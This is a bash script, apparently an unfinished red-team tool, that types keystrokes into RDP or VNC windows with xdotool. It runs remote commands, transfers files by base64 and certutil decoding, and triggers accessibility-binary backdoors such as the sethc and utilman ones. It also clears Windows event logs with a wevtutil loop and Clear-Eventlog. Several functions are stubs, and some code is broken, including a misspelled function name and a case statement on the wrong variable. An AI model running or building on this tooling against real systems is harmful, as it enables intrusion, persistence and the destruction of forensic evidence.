#!/bin/bash

function print_status {
    local status=$1
    local message=$2

    # Blue for information
    # Bold Blue for progress
    # Bold Green for completed
    # Bold Yellow for warning
    # Bold Red for error
    # * default to white 
    case $status in
        information) color="\033[34m[*]\033[0m" ;;
        progress) color="\033[1;34m[*]\033[0m" ;;
        completed) color="\033[1;32m[+]\033[0m" ;;
        warning) color="\033[1;33m[!]\033[0m" ;;
        error) color="\033[1;31m[-]\033[0m" ;;
        *) color="\033[0m" ;;
    esac

    echo -e "$color $message"
}

function check_dependencies() {
    if ! which xdotool &>/dev/null
    then
        print_status "warning" "Installing missing dependency..."
        if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
        then
            apt install -y xdotool
        else
            sudo apt install -y xdotool
        fi
        exit 1
    fi
}

function xdotool_return_input {
    local input=$1
    local key=$2
    
    if [ "$key" = "return" ]
    then
        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
    elif [ "$key" = "copycon" ]
    then
        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$input"
        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
    elif [ "$key" = "custom" ]
    then
        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key "$input"
    fi
}

function random_string {
    local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local length=$(( RANDOM % 13 + 8 ))  # Random number between 8 and 20
    local string=""
    
    for (( i=0; i<$length; i++ ))
    do
        local random_index=$(( RANDOM % ${#characters} ))
        string+=${characters:$random_index:1}
    done
    
    echo "$string"
}

function CmdFile {
    local file=$1

    echo print_status "progress" "Executing commands..."
    while read -r line
    do
        xdotool_return_input "$line" "return"
    done < "$file"
    echo print_status "completed" "Task completed!"
}

function Execute {
    local commands=$1
    local method=$2

    case $method in
        none)
            print_status "progress" "Executing commands..."
            xdotool_return_input "$commands" "return"
            print_status "completed" "Task completed!"
            ;;
        dialogbox)
            DialogBox "$commands"
            ;;
        runspace)
            MSBuild "$commands"
            ;;
        *)
            print_status "error" "Invalid Execution Type!" >&2
            exit 1
            ;;
    esac
}

function DialogBox {
    local commands=$1

    print_status "progress" "Checking one of the lines reaches 260 character limit"
    length=$(echo -n "$commands" | wc -c)
    if [ "$length" -ge 260 ]
    then
        print_status "error" "Character Limit reached! Terminating program."
        exit 1
    fi

    print_status "progress" "Executing commands..."
    xdotool_return_input "Super+r" "custom"
    xdotool_return_input "$commands" "return"
    print_status "completed" "Task completed!"
}

function MSBuild {
    # TODO: Add two methods one for adding shellcode and the other for powershell runspace
    # Add a flag C# implant

    # Add a flag if an input is passed as powershell runspace
    echo "msbuild"
}

function OutputRemoteFile {
    local local_file=$1
    local remote_file=$2
    local platform=$3
    local method=$4

    # TODO: Implement bin2hex method
    case $method in
        "" | pwshb64)
            Base64 "$local_file" "$remote_file" "$platform" "powershell"
            ;;
        cmdb64)
            Base64 "$local_file" "$remote_file" "$platform" "cmd"
            ;;
        nixb64)
            Base64 "$local_file" "$remote_file" "$platform" "console"
            ;;
        outfile)
            PowershellOutFile "$local_file" "$remote_file" "$platform" "text"
            ;;
        pwshcertutil)
            PowershellOutFile "$local_file" "$remote_file" "$platform" "certutil"
            ;;
        copycon)
            CopyCon "$local_file" "$remote_file" "$platform" "text"
            ;;
        *)
            print_status "error" "Invalid File Transfer Technique!" >&2
            exit 1
            ;;
    esac
}

function Base64 {
    local input=$1
    local output_file=$2
    local platform=$3
    local mode=$4
    
    local random1=$(random_string)
    local random2=$(random_string)

    # Check if input is passed as file
    if [ -f "$input" ]
    then
        print_status "progress" "Transferring file..."
        if [[ "$platform" = "windows" || "$platform" = "linux" && "$mode" = "powershell" ]]
        then
            file_type=$(file "$input")
            
            if [[ "$file_type" == *"ASCII text"* ]]
            then
                file=$(iconv -f ASCII -t UTF-16LE "$input" | base64 -w 0)
            else
                file=$(base64 -w 0 "$input")
            fi
            
            base64_decoder=$(cat <<EOF
\$${random1} = "$file"
\[byte[]]\$${random2} = [Convert]::FromBase64String(\$${random1})
[IO.File]::WriteAllBytes("$output_file", \$${random2})
EOF
)
            print_status "progress" "Checking one of the lines reaches 3477 character limit"
            while read -r line
            do
                length=$(echo -n "$line" | wc -c)
                if [ "$length" -ge 3477 ]
                then
                    print_status "error" "Character Limit reached!"
                    print_status "information" "Use 'pwshcertutil' as a method instead."
                    print_status "information" "Terminating program..."
                    exit 1
                fi
            done <<< "$base64_decoder"
            
            while IFS= read -r line
            do
                xdotool_return_input "$line" "return"
            done <<< "$base64_decoder"
            
            while IFS= read -r line
            do
                xdotool_return_input "$line" "return"
            done <<< "$base64_decoder"
        elif [[ "$platform" = "windows" && "$mode" = "cmd" ]]
        then
            # TODO: Implement certutil base64 file transfer
            CopyCon "$input" "$output_file" "$platform" "base64"
        elif [[ "$platform" = "linux" && "$mode" = "console" ]]
        then
            while read -r line
            do
                xdotool_return_input "echo -n $line | base64 -d > $output_file" "return"
            done < "$file"
        fi

        print_status "completed" "File transferred!"
    fi

    # TODO: Finish the implementation

    # When input is string and not a file.
    if [[ ! -f "$input" && -n "$input" ]]
    then
        echo "Not implemented"
        multiline=$(cat <<<EOF
"$input"
EOF
)
        count_line=$(echo "$multiline" | wc -l)
    fi
}

function PowershellOutFile {
    local input=$1
    local output_file=$2
    local platform=$3
    local mode=$4
    
    local random_temp=$(random_string)
    
    if [[ "$platform" != "windows" && "$platform" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
    fi
    
    # TODO: Test the function and modify when necessary
    if [ -f "$input" ]
    then
        if [ "$mode" = "text" ]
        then
            file_type=$(file "$input")
            if [[ "$file_type" == *"ASCII text"* ]]
            then
                print_status "progress" "Checking one of the lines reaches 3477 character limit"
                while read -r line
                do
                    length=$(echo -n "$line" | wc -c)
                    if [ "$length" -ge 3477 ]
                    then
                        print_status "error" "Character Limit reached!"
                        print_status "information" "Use 'pwshcertutil' as a method instead."
                        print_status "information" "Terminating program..."
                        exit 1
                    fi
                done < "$input"
                
                echo print_status "progress" "Transferring file..."
                xdotool_return_input "@'" "return"
                while read -r line
                do
                    xdotool_return_input "$line" "return"
                done < "$input"
                
                xdotool_return_input "'@ | Out-File $output_file" "return"
            else
                echo print_status "warning" "This is a binary file! Switching to \"pwshcertutil\" method instead..."
                PowershellOutFile "$input" "$output_file" "$platform" "certutil"
            fi
            
            
        elif [ "$mode" = "certutil" ]
        then
            print_status "progress" "Transferring file..."
            base64_string=$(base64 -w 64 "$input")
            xdotool_return_input "@'" "return"
            xdotool_return_input "\"-----BEGIN CERTIFICATE-----\"" "return"
            
            while IFS= read -r line
            do
                xdotool_return_input "$line" "return"
            done <<< "$base64_string"
            
            xdotool_return_input "\"-----END CERTIFICATE-----\"" "return"
            xdotool_return_input "'@ | Out-File ${random_temp}" "return"
            xdotool_return_input "CertUtil.exe -decode ${random_temp} $output_file" "return"
            
            xdotool_return_input "Remove-Item -Force ${random_temp}" "return"
        fi
    fi
    
    echo print_status "completed" "File transferred!"
}

function CopyCon {
    local input=$1
    local output_file=$2
    local platform=$3
    local mode=$4
    
    local random_temp=$(random_string)

    if [ "$platform" != "windows" ]
    then
        print_status "error" "copycon only exists on Windows operating system user!"
        print_status "information" "Use 'pwshb64' as a method instead."
        print_status "information" "Terminating program..."
        exit 1
    fi
    
    if [[ -f "$input" && "$mode" = "text" ]]
    then
        print_status "progress" "Checking one of the lines reaches 255 character limit"
        while read -r line
        do
            length=$(echo -n "$line" | wc -c)
            if [ "$length" -ge 255 ]
            then
                print_status "error" "Character Limit reached!"
                print_status "information" "Use 'cmdb64' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi
        done < "$input"

        print_status "progress" "Transferring file..."
        xdotool_return_input "copy con $output_file" "return"

        # TODO: Test it to ensure it's functional
        line_count=$(wc -l < "$input")
        counter=1
        while read -r line
        do
            if [ "$counter" -ne "$line_count" ]
            then
                xdotool_return_input "$line" "return"
            else
                xdotool_return_input "$line" "copycon"
            fi
            ((counter++))
        done < "$input"
    elif [ "$mode" = "base64" ]
    then
        # TODO: Ensure it works
        print_status "progress" "Transferring file..."
        xdotool_return_input "copy con ${random_temp}" "return"
        xdotool_return_input "\"-----BEGIN CERTIFICATE-----\"" "return"
        
        if [ -f "$input" ]
        then
            while read -r line
            do
                xdotool_return_input "$line" "return"
            done < "$input"
        elif [ ! -f "$input" && -n "$input" ]]
        then
            while IFS= read -r line
            do
                xdotool_return_input "$line" "return"
            done <<< "$input"
        fi
        
        xdotool_return_input "-----END CERTIFICATE-----" "copycon"

        dotool_return_input "CertUtil.exe -decode ${random_temp} $output_file" "return"
        dotool_return_input "del /f ${random_temp}" "return"
    fi

    print_status "completed" "File transferred!"
}

function CreateUser {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" = "windows" ]
    then
        echo "Windows"
    elif [ "$platform" = "linux" ]
    then
        echo "Linux"
    fi

    if [ "$mode" = "info" ]
    then
        echo "$description"   
    else
        print_status "error" "Invalid mode!"
    fi
}

function StickyKey {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" != "windows" ]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "backdoor" ]
    then
        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
        xdotool_return_input "shift shift shift shift shift" "custom"
        print_status "completed" "Backdoor Activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function UtilityManager {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" != "windows" ]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "backdoor" ]
    then
        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
        xdotool_return_input "Super+u" "custom"
        print_status "completed" "Backdoor Activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Magnifier {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" != "windows" ]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi
    
    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "backdoor" ]
    then
        print_status "progress" "Activating magnifier.exe backdoor..."
        xdotool_return_input "Super+equal" "custom"
        xdotool_return_input "Super+minus" "custom"
        print_status "completed" "Backdoor Activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Narrator {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" != "windows" ]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "backdoor" ]
    then
        print_status "progress" "Activating narrator.exe backdoor..."
        xdotool_return_input "Super+Return" "custom"
        print_status "completed" "Backdoor Activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function DisplaySwitch {
    local mode=$1
    local platform=$2
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [ "$platform" != "windows" ]
    then
        print_status "error" "Registry keys only exists on Windows operating system user!"
        exit 1
    fi

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "backdoor" ]
    then
        print_status "progress" "Activating displayswitch.exe backdoor..."
        xdotool_return_input "Super+p" "custom"
        print_status "completed" "Backdoor Activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function Persistence {
    local persistence_mode=$1
    local platform=$2
    local persistence_method=$3

    # -s, --select flag "info,backdoor". For "info" contains the execution commands
    # for both command prompt and powershell. To enumerate, persistence and cleanup
    # For "backdoor" to activate the backdoor
    # TODO: Fill in the rest of the persistence methods
    case $persistence_method in
        createuser)
            CreateUser "$persistence_mode" "$platform"
            ;;
        sethc)
            StickyKey "$persistence_mode" "$platform"
            ;;
        utilman)
            UtilityManager "$persistence_mode" "$platform"
            ;;
        magnifier)
            Magnifier "$persistence_mode" "$platform"
            ;;
        narrator)
            Narrator "$persistence_mode" "$platform"
            ;;
        displayswitch)
            DisplaySwitch "$persistence_mode" "$platform"
            ;;
        *)
            print_status "error" "Invalid Persistence Technique!" >&2
            exit 1
            ;;
    esac
}

function PrivEsc {
    local elevate_mode=$1
    local platform=$2
    local elevate_method=$3
    # TODO: add -e, --elevated flag
    # -e info -p <windows | linux> -m bypassuac
    echo "Not implemented"
}

function WevUtil {
    local mode=$1
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "execute" ]
    then
        Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
    elif [ "$mode" = "script" ]
    then
    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function WinEvent {
    local mode=$1
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    if [ "$mode" = "info" ]
    then
        echo "$description"
    elif [ "$mode" = "execute" ]
    then
        Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
    elif [ "$mode" = "script" ]
    then
    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function EventViewer {
    local mode=$1
    local description=$(cat <<<EOF
"Fill in the description of the technique"
EOF
)

    if [ "$mode" = "info" ]
    then
        # TODO: Include information of this technique
        echo ""
    elif [[ $mode = "" || $mode = "manual" ]]
    then
        DialogBox "eventvwr.msc"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function AntiForensics {
    local antiforensics_mode=$1
    local platform=$2
    local antiforensics_method=$3
    # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box
    # add flag -a, --antiforensics

    # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
    # -p <windows | linux> -m <wevutil | winevent>
    
    # Batch script
    # Powershell script
    # Bash script
    case $persistence_method in
        wevutil)
            WevUtil "$antiforensics_mode" "$platform" "$antiforensics_method"
            ;;
        winevent)
            WinEvent "$antiforensics_mode" "$platform" "$antiforensics_method"
            ;;
        eventvwr)
            EventViewer "$antiforensics_mode $platform" "$antiforensics_method"
            ;;
        *)
            print_status "error" "Invalid Antiforensic Technique!" >&2
            exit 1
            ;;
    esac
}

# TODO: Add more flags once it's fully implemented
function usage() {
    cat << EOF
Usage: $0 (RemoteKeyStrokes)
Options:
    -c, --command <command | cmdfile>   Specify a command or a file containing to execute
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

    -p, --platform <operating_system>   Specify the operating system (windows is set by
                                        default if not specified)

    -m, --method <method>               Specify the file transfer or execution method
                                        (For file transfer "pwshb64" is set by default if
                                        not specified. For command execution method
                                        "none" is set by default if not specified)

    -w, --windowname <name>             Specify the window name for graphical remote
                                        program (freerdp is set by default if not
                                        specified)

    -h, --help                          Display this help message
EOF
    exit 1
}

long_opts="command:,input:,output:,elevate:,select:,antiforensics:,platform:,method:,windowname:,help"

OPTS=$(getopt -o "c:i:o:e:s:a:p:m:w:h" --long "$long_opts" -n "$(basename "$0")" -- "$@")
if [ $? != 0 ]
then
    echo "Failed to parse options... Exiting." >&2
    exit 1
fi

eval set -- "${OPTS}"

while true
do
    case "$1" in
        -c | --command)
            COMMAND=$2
            shift 2
            ;;
        -i | --input)
            INPUT=$2
            shift 2
            ;;
        -o | --output)
            OUTPUT=$2
            shift 2
            ;;
        -e | --elevate)
            ELEVATE=$2
            shift 2
            ;;
        -s | --select)
            SELECT=$2
            shift 2
            ;;
        -a | --antiforensics)
            ANTIFORENSICS=$2
            shift 2
            ;;
        -p | --platform)
            PLATFORM=$2
            shift 2
            ;;
        -m | --method)
            METHOD=$2
            shift 2
            ;;
        -w | --windowname)
            WINDOWNAME=$2
            shift 2
            ;;
        -h | --help)
            usage
            ;;
        --)
            shift
            break
            ;;
        *)
            echo "Invalid option: $1" >&2
            exit 1
            ;;
    esac
done

function main() {
    check_dependencies

    if [ -z "$WINDOWNAME" ]
    then
        WINDOWNAME="FreeRDP"
    elif [[ "$WINDOWNAME" != "freerdp" && "$WINDOWNAME" != "rdesktop" && "$WINDOWNAME" != "tightvnc" ]]
    then
        print_status "error" "Invalid window name specified. Allowed values: 'freerdp', 'rdesktop', or 'tightvnc'."
        exit 1
    fi

    # Select graphical remote program to match the window name
    if [ "$WINDOWNAME" = "freerdp" ]
    then
        WINDOWNAME="FreeRDP"
    elif [ "$WINDOWNAME" = "rdesktop" ]
    then
        return
    elif [ "$WINDOWNAME" = "tightvnc" ]
    then
        WINDOWNAME="TightVNC"
    fi

    # Operating System
    if [ -z "$PLATFORM" ]
    then
        PLATFORM="windows"
    elif [[ "$PLATFORM" != "windows" && "$PLATFORM" != "linux" ]]
    then
        print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
        exit 1
    fi

    # Executing commands
    if [ -f "$COMMAND" ]
    then
        # Check if a file is passed as input
        CmdFile "$COMMAND"
    fi
    
    if [[ ! -f "$COMMAND" && -n "$COMMAND" ]]
    then
        # When input is string and not a file. It executes command
        if [ -z "$METHOD" ]
        then
            METHOD="none"
        fi
        Execute "$COMMAND" "$METHOD"
    fi
    
    # File transfer
    if [[ -f "$INPUT" && -n "$OUTPUT" ]]
    then
        OutputRemoteFile "$INPUT" "$OUTPUT" "$PLATFORM" "$METHOD"
    fi

    # Privilege Escalation
    if [[ -n "$ELEVATE" && -n "$METHOD" ]]
    then
        # -e info -p <windows | linux> -m bypassuac
        PrivEsc "$ELEVATE" "$PLATFORM" "$METHOD"
    fi

    # Persistence
    if [[ -n "$SELECT" && -n "$METHOD" ]]
    then
        # -s <info | backdoor> -p <windows | linux> -m <persistence_method>
        Persistence "$SELECT" "$PLATFORM" "$METHOD"
    fi

    # Antiforensics
    if [[ -n "$ANTIFORENSICS" && -n "$METHOD" ]]
    then
        # -a <info | execute> -p <windows | linux> -m <antiforensics_method>
        AntiForensics "$ANTIFORENSICS" "$PLATFORM" "$METHOD"
    fi
}

main
